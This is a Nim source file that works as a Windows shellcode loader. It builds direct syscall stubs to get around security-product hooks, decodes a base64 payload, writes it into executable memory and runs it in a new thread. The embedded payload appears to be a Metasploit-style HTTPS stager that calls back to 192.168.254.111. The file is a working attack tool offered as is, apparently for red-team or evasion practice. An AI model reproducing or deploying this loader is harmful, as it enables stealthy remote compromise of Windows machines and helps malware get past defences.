import base64
import winim
import winim/lean

import osproc
include utils/GetSyscallStub

type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}

type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

type myNtWaitForSingleObject = proc(ObjectHandle: HANDLE, Alertable: BOOLEAN, TimeOut: PLARGE_INTEGER): NTSTATUS {.stdcall.}


proc vanilla[byte](shellcode: openArray[byte]): void =
  var SYSCALL_STUB_SIZE: int = 23;
  var status: NTSTATUS
  var success: BOOL

  let tProcess = startProcess("notepad.exe")
  tProcess.suspend() # That's handy!
  defer: tProcess.close()

  var cid: CLIENT_ID
  cid.UniqueProcess = tProcess.processID
    
  let tProcess2 = GetCurrentProcessId()
  var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

  let syscallStub_NtAlloc = VirtualAllocEx(pHandle2, NULL, cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
  var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
  var syscallStub_NtWait: HANDLE = cast[HANDLE](syscallStub_NtCreate) + cast[HANDLE](SYSCALL_STUB_SIZE)

  var op: DWORD = 0

  # define NtAllocateVirtualMemory
  let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
  VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr op)

  # define NtWriteVirtualMemory
  let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
  VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr op)

  # define NtCreateThreadEx
  let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
  VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr op)

  # define NtWaitForSingleObject
  let NtWaitForSingleObject = cast[myNtWaitForSingleObject](cast[LPVOID](syscallStub_NtWait))
  VirtualProtect(cast[LPVOID](syscallStub_NtWait), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr op)

  success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
  success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
  success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
  success = GetSyscallStub("NtWaitForSingleObject", cast[LPVOID](syscallStub_NtWait));

  var rPtr: LPVOID
  var sc_size = cast[SIZE_T](shellcode.len)
  var pHandle = GetCurrentProcess()
  var res: WINBOOL

  res = NtAllocateVirtualMemory(pHandle, addr rPtr, 0, addr sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

  var bytesWritten: SIZE_T
  res = NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr shellcode, sc_size-1, addr bytesWritten)

  var tHandle: HANDLE 
  res = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, rPtr, NULL, FALSE, 0, 0, 0, NULL)
  res = NtWaitForSingleObject(tHandle, TRUE, NULL);

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8veTZEagA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzUuMCkNCgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWABBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTExAAAAAAA="

  let shellcode = toByteSeq(decode(enc))
  vanilla(shellcode)
